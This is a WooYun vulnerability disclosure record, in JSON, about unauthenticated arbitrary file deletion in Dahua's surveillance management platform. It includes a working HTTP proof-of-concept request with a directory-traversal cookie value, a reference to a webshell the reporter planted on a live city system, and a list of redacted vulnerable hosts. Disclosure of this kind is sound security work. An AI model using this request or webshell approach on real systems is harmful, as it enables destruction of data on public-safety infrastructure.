{"id": 81287, "wybug_id": "wooyun-2015-0154066", "wybug_title": "某综合监控管理平台配置不当未授权访问致任意文件删除(以某市平安城市为例)", "wybug_corp": "浙江大华技术股份有限公司", "wybug_author": "路人甲", "wybug_date": "2015-11-26 12:18", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "非授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏认证", "越权操作"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-03：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2016-01-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： 某综合监控管理平台配置不当未授权访问致任意文件删除(以某市平安城市为例) 详细说明：  浙江大华作为全国第二大的监控产品供应商和解决方案服务商，其产品在党政、公安、监狱、学校等占有很大的市场份额，top2的监控产品供应商的用户量可想而知了。来看看存在本漏洞的部分案例吧，国家电网某站也中枪了（http://**.**.**.**/）本次漏洞出现在浙江大华的“综合监控管理平台”上。先说下这个漏洞吧：平台配置不当导致本应该只有超级管理员可以访问的某文件删除接口被未授权访问，而该接口并未对用户输入的文件名进行严格的过滤，因此，文件名后缀可以是任意的，同时，可跳转目录，造成了任意文件删除漏洞。下面整个过程都以 邵阳市平安城市 为例进行说明：**.**.**.**/因为是任意文件删除漏洞，为了避免影响被测系统，这里给出一个webshell（菜刀一句话），在测试时，可先使用该shell在任意目录下新建或上传文件后，再进行删除测试。**.**.**.**/upload/admin/2015/10/-3541037853658285713.jsp   adminjsp该未授权访问的接口是http://xxxx/emap/bitmap/bitMap_delPicFromDisk.action被删除文件的当前路径为： /opt/tomcat/webapps/upload/emap/  Poc如下：\nPOST /emap/bitmap/bitMap_delPicFromDisk.action HTTP/1.1Host: **.**.**.**Content-Length: 22Accept: */*Origin: **.**.**.**X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: **.**.**.**/emap/admin.action?userId=1&act=addAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,de;q=0.6,en;q=0.4,zh-TW;q=0.2Cookie:mapNames=/../test.html\n当返回为1时，表示删除成功。如下图\n\n部分案例：\n**.**.**.**/portal/login_init.action**.**.**.**/portal/login_init.action**.**.**.**/portal/login_init.action**.**.**.**:8081/portal/login_init.action**.**.**.**:8081/portal/login_init.action**.**.**.**:8080/portal/login_init.action**.**.**.**:8080/portal/login_init.action**.**.**.**:8000/portal/login_init.action**.**.**.**:88/portal/login_init.action**.**.**.**:81/portal/login_init.action**.**.**.**:81/portal/login_init.action**.**.**.**:81/portal/login_init.action**.**.**.**:81/portal/login_init.action**.**.**.**:81/portal/login_init.action**.**.**.**:81/portal/login_init.action**.**.**.**:81/portal/login_init.action**.**.**.**:81/portal/login_init.action**.**.**.**:81/portal/login_init.action**.**.**.**:81/portal/login_init.action**.**.**.**:81/portal/login_init.action**.**.**.**:81/portal/login_init.action**.**.**.**:81/portal/login_init.action**.**.**.**/portal/login_init.action**.**.**.**:81/portal/login_init.action**.**.**.**:88/portal/login_init.action**.**.**.**:88/portal/login_init.action**.**.**.**:88/portal/login_init.action**.**.**.**:88/portal/login_init.action**.**.**.**:81/portal/login_init.action**.**.**.**:81/portal/login_init.action**.**.**.**:81/portal/login_init.action**.**.**.**/portal/login_init.action**.**.**.**/portal/login_init.action**.**.**.**/portal/login_init.action**.**.**.**/portal/login_init.action**.**.**.**/portal/login_init.action**.**.**.**/portal/login_init.action**.**.**.**/portal/login_init.action**.**.**.**/portal/login_init.action**.**.**.**/portal/login_init.action**.**.**.**/portal/login_init.action\n   漏洞证明：  见 详细说明   修复方案：  限制访问权限过滤用户输入   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2015-11-30 10:54 厂商回复： CNVD确认所述情况，已经转由CNCERT下发给浙江分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}